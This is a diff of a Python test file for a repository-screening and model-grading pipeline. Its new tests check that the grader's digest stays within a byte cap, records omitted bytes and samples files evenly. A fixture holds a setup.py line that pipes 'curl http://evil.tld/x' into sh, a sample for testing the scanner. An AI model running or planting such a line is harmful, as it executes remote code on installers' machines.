@@ -6,14 +6,24 @@ distinguishable from a run that finished and found little.
 
 from __future__ import annotations
 
+import re
+
 import pytest
 
 from gitseed.collect.search import Candidate, CollectResult
 from gitseed.evidence import ClaimBasis
 from gitseed.grade.types import GradeResult
-from gitseed.pipeline.run import FileFetchError, PipelineResult, Reviewed, ranked, run
+from gitseed.pipeline.run import (
+    FileFetchError,
+    PipelineResult,
+    Reviewed,
+    _digest,
+    ranked,
+    run,
+)
 from gitseed.screen.signals import HIGH, Signal
 
+MODEL_DIGEST_BYTE_CAP = 23_000
 CLEAN = [("main.py", "def add(a, b):\n    return a + b\n")]
 MALICIOUS = [("setup.py", "import os\nos.system('curl http://evil.tld/x | sh')\n")]
 
@@ -77,6 +87,120 @@ def test_the_grader_is_not_told_how_popular_the_repository_is() -> None:
     assert "10" not in digest.replace("a/one", "")
     assert "2026-07-01" not in digest
     assert "main.py" in digest
+
+
+def test_large_model_digest_is_bounded_and_declares_omissions() -> None:
+    # Given: selected source is valid for screening but much too large for a model prompt.
+    files = [(f"src/module_{number}.py", "x" * 4_000) for number in range(20)]
+
+    # When: the model-only digest is made.
+    digest = _digest(candidate("a/large"), files)
+
+    # Then: its evidence budget and every omitted byte are explicit.
+    assert len(digest.encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
+    assert "model-evidence: selected_files=20 sampled_files=16" in digest
+    assert "omitted_bytes=" in digest
+    assert "shortened=true" in digest
+
+
+def test_bounded_digest_samples_evenly_and_is_utf8_safe() -> None:
+    # Given: seventeen large UTF-8 files, so one deterministic sample must be omitted.
+    files = [(f"src/{number:02d}.py", f"file-{number}:" + "한" * 4_000) for number in range(17)]
+
+    # When: the grading evidence is reduced.
+    digest = _digest(candidate("a/even"), files)
+
+    # Then: it contains the fixed evenly spaced sample, including both endpoints.
+    expected = tuple((index * 16) // 15 for index in range(16))
+    assert len(digest.encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
+    assert "sampled_files=16" in digest
+    for index in expected:
+        assert f"--- src/{index:02d}.py" in digest
+    assert "--- src/15.py" not in digest
+    assert "shortened=true" in digest
+    assert digest.encode("utf-8").decode("utf-8") == digest
+
+
+def test_bounded_digest_accounting_counts_actual_utf8_prefix_bytes() -> None:
+    # Given: a multibyte source forces every equal byte share onto a UTF-8 boundary.
+    files = [(f"src/{number:02d}.py", "한" * 4_000) for number in range(17)]
+
+    # When: bounded evidence is rendered.
+    digest = _digest(candidate("a/accounting"), files)
+
+    # Then: per-file and aggregate included-byte facts describe text actually present.
+    sections = re.findall(
+        r"^--- [^\n]+ included=(\d+) shortened=(?:true|false)\]\n(.*?)(?=\n--- |\nmodel-evidence:)",
+        digest,
+        flags=re.MULTILINE | re.DOTALL,
+    )
+    actual_sizes = [len(text.encode("utf-8")) for _, text in sections]
+    assert [int(size) for size, _ in sections] == actual_sizes
+    accounting = re.search(r"included_bytes=(\d+)", digest)
+    assert accounting is not None
+    assert int(accounting.group(1)) == sum(actual_sizes)
+
+
+def test_small_model_digest_preserves_all_evidence() -> None:
+    # Given: all selected source and structure fit comfortably inside the model budget.
+    files = [("src/한글.py", "print('안녕')\n"), ("README.md", "small project\n")]
+
+    # When: the model digest is built.
+    digest = _digest(candidate("a/small"), files)
+
+    # Then: no source byte is silently removed and the zero omission is recorded.
+    assert "src/한글.py" in digest
+    assert "print('안녕')\n" in digest
+    assert "README.md" in digest
+    assert "small project\n" in digest
+    assert "model-evidence: selected_files=2 sampled_files=2" in digest
+    assert "omitted_bytes=0" in digest
+    assert "shortened=true" not in digest
+
+
+def test_screening_receives_all_files_before_grading_receives_a_bounded_digest(monkeypatch) -> None:
+    # Given: screening gets a large selected file set and the model gets its own representation.
+    files = [(f"src/module_{number}.py", "x" * 4_000) for number in range(20)]
+    scanned: list[tuple[tuple[str, str], ...]] = []
+
+    def scan_spy(received):
+        scanned.append(tuple(received))
+        return []
+
+    monkeypatch.setattr("gitseed.pipeline.run.scan_files", scan_spy)
+    grader = Grader()
+
+    # When: the candidate traverses the pipeline.
+    result = run(
+        CollectResult(candidates=[candidate("a/separate")]),
+        fetch_files=files_for({"a/separate": files}),
+        grader=grader,
+    )
+
+    # Then: scanner coverage is untouched while grading receives bounded evidence only.
+    assert scanned == [tuple(files)]
+    assert len(grader.seen) == 1
+    assert len(grader.seen[0].encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
+    assert result.reviewed[0].severity == "none"
+    assert result.reviewed[0].screened_files == tuple(path for path, _ in files)
+
+
+def test_oversized_model_evidence_structure_is_an_incomplete_candidate() -> None:
+    # Given: a required repository path alone cannot fit inside declared model evidence.
+    files = [("src/" + "p" * MODEL_DIGEST_BYTE_CAP, "x")]
+    grader = Grader()
+
+    # When: the pipeline reaches its grading boundary.
+    result = run(
+        CollectResult(candidates=[candidate("a/structural")]),
+        fetch_files=files_for({"a/structural": files}),
+        grader=grader,
+    )
+
+    # Then: no partial structural evidence or grade is produced.
+    assert grader.seen == []
+    assert result.complete is False
+    assert "model grading input structure exceeds 23000 UTF-8 bytes" in " ".join(result.incomplete_because)
 
 
 # --- an incomplete run must not look like a thin one --------------------------
